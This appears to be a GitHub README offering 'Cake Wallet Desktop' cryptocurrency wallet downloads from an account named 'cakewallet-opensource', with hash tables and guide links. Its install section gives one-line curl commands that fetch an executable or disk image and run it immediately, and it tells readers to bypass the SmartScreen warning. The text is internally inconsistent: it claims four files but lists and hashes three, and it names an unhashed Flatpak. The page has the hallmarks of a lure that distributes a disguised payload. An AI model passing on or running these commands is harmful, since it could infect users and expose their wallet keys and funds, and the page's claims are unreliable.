![Cake Wallet Desktop](assets/cake-wallet-download-monero-desktop-app-banner.png)

# Cake Wallet Desktop

Non-custodial, multi-currency wallet for Windows, macOS and Linux - MIT licensed.

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/blob/main/LICENSE.md"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

## SHA-256 checksums
<!-- SHA256-BEGIN -->
| File | SHA-256 |
| --- | --- |
| [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) | `4e51c97430d1cf3401298870b0725b90d52267b021dd244928af35f09347e52b` |
| [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) | `6515bb11c8f5f24c0acc1f32c91155382be3f7fbd5c8dde01cbed8b7487a8bc3` |
| [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) | `c24310b8f0a111580e59f38b48cfd40f66c6e4353d7629bee38b049e56b91025` |
<!-- SHA256-END -->

Check on Windows: `certutil -hashfile <file> SHA256`; macOS: `shasum -a 256 <file>`; Linux: `sha256sum <file>`.
Every character must match. If it differs, do not run the file; delete it and download again from the linked GitHub release.

> This release publishes four desktop files: the Windows installer, the macOS disk image and two Linux builds. There is no APK and no iOS file here. The hashes above are the ones published with this release, and every character has to match before you run anything.

## What this repository is for
This is the main repository for Cake Wallet: the application source in Dart/Flutter, the four desktop installers attached to each release, and the entry point for everything else in the account. The app is non-custodial, so keys are generated on your device and never sent anywhere; the repository publishes what the app is, and the three guide repositories publish how to use it. This release, v6.4.5, ships four files: a Windows installer, a macOS disk image and two Linux builds, one compressed archive and one Flatpak. There is no Android APK and no iOS file here, because mobile builds are distributed through the app stores. The SHA-256 values in the table below are the ones published with this release, and they are the only way to tell the published file from a renamed copy. The source tree is MIT licensed and the app carries no account, no telemetry requirement and no server of its own: it talks to blockchain nodes and to the providers you choose to use.

## Who it is for
- Desktop users who want the wallet as a downloadable application rather than a store install.
- Anyone verifying that the file they downloaded is the file this release published.
- Readers looking for the guides, which live in the three article repositories linked below.
- Developers reading the Dart/Flutter source before building from it themselves.

## Start here
- [cake-wallet-windows-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md) - Install the Windows build, clear the SmartScreen prompt and check the file you downloaded before you run it.
- [cake-wallet-restore-wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) - Restore from a phrase, a private key or a backup file, including the 25-word Monero case.
- [cake-wallet-backup-recovery-phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) - Write down and test the phrase that brings the wallet back when the device is gone.
- [cake-wallet-supported-coins-networks](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) - See which coins and networks the wallet supports, including the ones it does not support.

## How to use these guides
1. Pick the file for your platform from the table above; there is one per desktop OS and no mobile file here.
2. Compare its SHA-256 with the value in the checksum table before running it.
3. Install it, set a PIN and write the recovery phrase down before you add funds.
4. Use the guides repository for the task you are doing; every page there assumes this build.
5. Keep the installer's hash if you keep the installer: a file you cannot verify later is not a backup.

## The guides
### Setup and recovery
The setup and recovery pages live in `cake-wallet-guides`: [cake-wallet-guides](https://github.com/cakewallet-opensource/cake-wallet-guides).
### Fixes and support
The fixes and support pages live in `cake-wallet-help`: [cake-wallet-help](https://github.com/cakewallet-opensource/cake-wallet-help).
### Privacy and coins
The privacy and coins pages live in `cake-wallet-privacy`: [cake-wallet-privacy](https://github.com/cakewallet-opensource/cake-wallet-privacy).
## What each guide changes
| Task | Guide | Outcome |
| --- | --- | --- |
| Install on Windows | [cake-wallet-windows-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md) | A verified installer and a wallet that opens |
| Install on macOS | [cake-wallet-macos-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-macos-install.md) | A disk image opened and Gatekeeper cleared once |
| Install on Linux | [cake-wallet-linux-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-linux-install.md) | An extracted archive or a Flatpak that runs |
| Restore a wallet | [cake-wallet-restore-wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) | The same addresses and history on a new device |
| Check a download | [cake-wallet-verify-download](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-verify-download.md) | A hash that matches, or a file deleted |
| See supported coins | [cake-wallet-supported-coins-networks](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) | A clear yes or no before you send anything |

## Common first questions
### Which repositories are official?
This one holds the app and its installers; the three linked below hold the guides. All of them live under the same account.

### Where are the Android and iOS builds?
Not in this release. Mobile builds come from Google Play and the App Store, and no APK or iOS file is published here.

### Is the app free?
Yes. Network fees are paid to the chain and providers charge their own fees; the wallet itself costs nothing.

### Does it hold my keys?
No. Keys are generated and stored on your device, and the recovery phrase is the only portable copy.

## Before you install
- Know which desktop platform file you need; the four assets are not interchangeable.
- Have somewhere offline to write the recovery phrase.
- Check the hash before running the installer.
- Read the install page for your OS if any step looks unfamiliar.

## About and license
Cake Wallet is an open-source, non-custodial multi-currency wallet by Cake Labs. The source in this repository is licensed MIT; read `LICENSE.md` for the exact terms. These pages describe the app as documented at the time of writing and make no promise about builds that are not published here.

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
No one-line command is published for Linux. The release ships a compressed archive, not an installer the shell can launch, so the download either needs extracting or needs the Flatpak build instead. Extract it with your file manager, or unpack it in a terminal with `tar -xf`, then run the executable inside the folder.

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> for the portable build, or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a> if your distribution prefers Flatpak.
2. For the archive, extract it and keep the whole folder together.
3. For the Flatpak file, install it with your software centre, or run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak`.
4. Run the app from the extracted folder or from your application menu.

<!-- INSTALL-END -->
